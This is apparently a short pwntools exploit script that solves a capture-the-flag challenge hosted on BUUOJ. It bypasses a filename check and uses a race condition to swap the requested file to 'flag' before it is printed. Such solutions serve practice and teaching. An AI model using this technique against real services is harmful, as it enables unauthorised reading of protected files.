'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled

1. send any filename to bypass '.' & '/' check
2. race condition to change filename to 'flag' before printf
'''

from pwn import *


local = 0
url, port = "node5.buuoj.cn", "26611" 
filename = "./pwn"
elf = ELF(filename)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)
    pass

def B():
    gdb.attach(io)
    pause()

def pwn():
    # pass '/' '.' checking
    io.sendlineafter(b'==>', b'2')
    io.sendlineafter(b'to cat.\n', b'pwn')
    io.sendlineafter(b'==>', b'3')
    io.sendlineafter(b'to change.\n', b'flag') 


if __name__ == "__main__":
    pwn()
    io.interactive()
